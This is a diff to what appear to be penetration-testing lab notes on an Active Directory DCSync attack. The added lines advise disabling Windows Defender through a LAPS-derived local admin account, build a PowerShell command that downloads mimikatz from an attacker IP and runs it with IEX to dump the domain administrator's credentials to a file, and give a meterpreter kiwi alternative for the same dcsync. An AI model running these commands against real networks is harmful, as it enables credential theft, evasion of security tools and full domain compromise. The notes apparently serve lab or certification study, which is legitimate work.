@@ -45,7 +45,7 @@ String cmd2 = "(New-Object System.Net.WebClient).DownloadString('http://192.168.
 
 
 
-5) Load the DC machine account ticket into your current domain user; and attempt to DCSync
+5) Load the DC machine account ticket into your current domain user; and attempt to DCSync. Prior to loading mimikatz, you may need to find someway to disable defender. This can be done via a LOCAL high priv account (For example from LAPS) and disable the defender via another shell.
 
 ```csharp
 // Watch the quotation marks! 
@@ -56,4 +56,16 @@ String cmd2 = "(New-Object System.Net.WebClient).DownloadString('http://192.168.
 String cmdmimi = "lsadump::dcsync /domain:infinity.com /user:infinity\\administrator";
 
 String cmd2 = $"(New-Object System.Net.WebClient).DownloadString('http://192.168.45.178/mimikatz.txt') | IEX; Invoke-Mimikatz -Command {cmdmimi} | Out-File -FilePath C:\\windows\\tasks\\dcsync.txt";
+```
+
+
+*ALTERNATIVE WAY*
+
+- Since you have a meterpreter session, you can make use of kiwi!
+
+```bash
+meterpreter > load kiwi
+# dcsync followed by the account you want to target
+meterpreter > dcsync administrator 
+
 ```
